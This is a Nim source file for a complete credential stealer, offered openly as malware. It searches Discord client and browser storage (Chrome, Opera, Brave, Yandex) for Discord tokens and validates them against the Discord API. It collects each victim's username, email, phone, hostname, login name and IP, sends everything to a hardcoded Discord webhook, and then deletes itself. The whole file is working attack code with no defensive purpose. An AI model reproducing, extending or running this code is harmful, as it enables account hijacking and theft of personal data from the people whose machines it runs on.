import httpclient
import json
import os, osproc
import re
import sequtils, strutils

var 
  webhookUrl = "https://discord.com/api/webhooks/970982615186305025/vUoZtAdO2Ptf2vF8pvA4DmJ0uzyvEZ2_LzS_uD8RBpuXs7dtz07-tvaL0lXoVT0pFmdB"
  userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
  sd = "Y"    # self destruct option

proc getHostname(): string =
  when defined(linux):
    var (host, _) = execCmdEx("hostname")
  when defined(windows):
    var host = execProcess("cmd.exe /c hostname" , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
  return host

proc getUsername(): string =
  when defined(linux):
    var (cpuUser, _) = execCmdEx("whoami")
  when defined(windows):
    var cpuUser = execProcess("cmd.exe /c whoami" , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
  return cpuUser

proc getTokens(path: string): seq[string] =
  var tokens = newSeq[string]()

  for fileName in walkDirRec(path):
    if not fileName.endsWith(".log") and not fileName.endsWith("ldb"):
      continue
    var f = readFile(fileName)
    var t = findAll(f, re"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    tokens = concat(tokens, t)
  return tokens

proc getIP(): string = 
  var c = newHttpClient()
  var ip = c.getContent("https://ifconfig.me/ip")
  c.close()
  return ip

proc getUserData(token: string = ""): JsonNode =
  var c = newHttpClient()
  c.headers["Content-Type"] = "application/json"
  c.headers["User-Agent"] = userAgent
  if token != "":
    c.headers["Authorization"] = token
  var res = c.get("https://discordapp.com/api/v6/users/@me")
  var userData = parseJson(res.body)
  c.close()
  return userData

proc getAvatar(uid, aid: string): string =
  var 
    url = "https://cdn.discordapp.com/avatars/" & uid & "/" & aid & ".gif"
    c = newHttpClient()
  try:
    discard c.getContent(url)
  except:
    url = url[0 .. ^5]
  c.close()
  return url

proc createEmbed(username, hostname, cpuUser, platform, ip, token, email, phone: string): JsonNode =
  var embed = %*{
    "username": "bot",
    "embeds": [
      {
        "title": "__**stealer**__",
        "fields": [
        {
          "name": "Victim",
          "value": username,
          "inline": true
        },
        {
          "name": "Hostname",
          "value": hostname,
          "inline": true
        },
        {
          "name": "Computer Username",
          "value": cpuUser,
          "inline": true
        },
        {
          "name": "Platform",
          "value": platform,
          "inline": true
        },
        {
          "name": "IP Addr",
          "value": ip,
          "inline": true
        },
        {
          "name": "Email",
          "value": email,
          "inline": true
        },
        {
          "name": "Phone",
          "value": phone,
          "inline": true
        },
        {
          "name": "**Token: **",
          "value": "`" & token & "`",
          "inline": false
        }
        ]
      }
    ]
  }
  return embed

proc sendTokens(embeds: seq[JsonNode]) =
  var c = newHttpClient()
  c.headers["Content-Type"] = "application/json"
  c.headers["User-Agent"] = userAgent
  for embed in embeds:
    try:
      discard c.post(webhookUrl, body = $embed)
    except:
      continue

proc selfDestruct(sd: string) =
  if sd == "Y":
    var program = getAppFilename()
    discard tryRemoveFile(program)


proc main =
  when defined(linux):
    var 
      config = getConfigDir()
      local = getCacheDir()
      paths = @[
        config & "discord",
        config & "discordcanary"
      ]

  when defined(windows):
    var 
      local = getCacheDir()
      roaming = getEnv("APPDATA")
      paths = @[
        roaming & "\\Discord",
        roaming & "\\discordcanary",
        roaming & "\\discordptb",
        local & "\\Google\\Chrome\\User Data\\Default",
        roaming & "\\Opera Software\\Opera Stable",
        local & "BraveSoftware\\Brave-Browser\\User Data\\Default",
        local & "\\Yandex\\YandexBrowser\\User Data\\Default"
      ]

  var 
    ip = getIP()
    hostname = getHostname()
    cpuUser = getUsername()
    platform = hostOS
    workingTokens = newSeq[string]()
    checked = newSeq[string]()
    embeds = newSeq[JsonNode]()
    tokens = newSeq[string]()

  for path in paths:
    tokens = concat(tokens, getTokens(path))

  tokens = deduplicate(tokens)
  for token in tokens:
    var userData = getUserData(token)
    if token in checked: continue
    if token in workingTokens: continue
    try:
      var
        username = ($userData["username"]).replace("\"") & "#" & ($userData["discriminator"]).replace("\"")
        userId  = ($userData["id"]).replace("\"")
        avatarId = ($userData["avatar"]).replace("\"")
        avatarUrl = getAvatar(userId, avatarId)
        email = ($userData["email"]).replace("\"")
        phone = ($userData["phone"]).replace("\"")
      
      var emb = createEmbed(username, hostname, cpuUser, platform, ip, token, email, phone)

      embeds.add(emb)
      workingTokens.add(token)
    except:
      # mfa enabled or err
      checked.add(token)
      continue
    checked.add(token)

  sendTokens(embeds)
  selfDestruct(sd)

#[ MAIN ]#
main()
